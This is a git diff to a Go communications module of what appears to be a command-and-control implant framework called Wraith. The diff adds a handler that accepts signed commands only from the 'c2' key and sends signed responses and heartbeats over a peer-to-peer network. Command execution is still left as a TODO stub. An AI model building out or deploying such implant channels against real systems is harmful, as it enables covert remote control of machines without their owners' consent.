@@ -1,11 +1,13 @@
 package modulepinecomms
 
 import (
+	"bytes"
 	"context"
 	"crypto/ed25519"
 	"encoding/hex"
 	"fmt"
 	"math/rand"
+	"net/http"
 	"os"
 	"os/user"
 	"runtime"
@@ -41,6 +43,76 @@ type ModulePinecomms struct {
 	StaticPeers  []string
 }
 
+func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith, pm pmanager.Manager, packet proto.Packet) {
+
+	//
+	// Validate and process the packet.
+	//
+
+	peerPublicKey, err := hex.DecodeString(packet.Peer)
+	if err != nil {
+		// This shouldn't happen, but if the peer public key is
+		// malformed then we have no choice but to ignore the
+		// packet.
+		return
+	}
+
+	if !bytes.Equal(peerPublicKey, m.AdminPubKey) {
+		// This ensures that request packets are only accepted from
+		// the c2. As packets are signed, eventually we may be able
+		// to drop this check if we account for replay attacks. This
+		// would allow for store-and-forward capability where new
+		// Wraiths coming online will continue to execute commands
+		// or load modules even if c2 is down.
+		return
+	}
+
+	packetData := proto.PacketReq{}
+	err = proto.Unmarshal(&packetData, m.AdminPubKey, packet.Data)
+	if err != nil {
+		// The packet data is malformed, there is nothing more we
+		// can do.
+		return
+	}
+
+	//
+	// Evaluate the packet conditions.
+	//
+
+	// TODO
+	//packetData.Conditions
+
+	//
+	// Execute the packet payload.
+	//
+
+	// TODO
+
+	//
+	// Respond to the packet.
+	//
+
+	responseData := proto.PacketRes{
+		TxId: packetData.TxId,
+		// TODO
+	}
+
+	responseDataBytes, err := proto.Marshal(&responseData, m.OwnPrivKey)
+	if err != nil {
+		// There is no point sending anything because the TxId is included
+		// in the responseData and without it, c2 won't know what the response
+		// is to.
+		return
+	}
+
+	pm.Send(ctx, proto.Packet{
+		Peer:   packet.Peer,
+		Method: http.MethodPost,
+		Route:  proto.ROUTE_RESPONSE,
+		Data:   responseDataBytes,
+	})
+}
+
 func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 	// Ensure this instance is only started once and mark as running if so
 	single := m.mutex.TryLock()
@@ -65,8 +137,7 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 	//
 
 	pm.SetPineconeIdentity(m.OwnPrivKey)
-	//pm.SetInboundAddr(c.pineconeInboundTcpAddr)
-	//pm.SetWebserverAddr(c.pineconeInboundWebAddr)
+	pm.SetInboundAddr(":0")
 	pm.SetUseMulticast(m.UseMulticast)
 	pm.SetStaticPeers(m.StaticPeers)
 
@@ -132,7 +203,7 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 				// Send the packet.
 				pm.Send(ctx, proto.Packet{
 					Peer:   hex.EncodeToString(m.AdminPubKey),
-					Method: "POST",
+					Method: http.MethodPost,
 					Route:  proto.ROUTE_HEARTBEAT,
 					Data:   heartbeatBytes,
 				})
@@ -155,10 +226,8 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 		case packet := <-recv:
 			switch packet.Route {
 			case proto.ROUTE_REQUEST:
-				// TODO: Prevent replay attacks
-				packetData := proto.PacketReq{}
-				proto.Unmarshal(&packetData, m.AdminPubKey, packet.Data)
-				fmt.Printf("%v\n", packetData)
+				// Launch a goroutine to handle the request and issue a response.
+				go m.handleRequest(ctx, w, pm, packet)
 			}
 		}
 	}
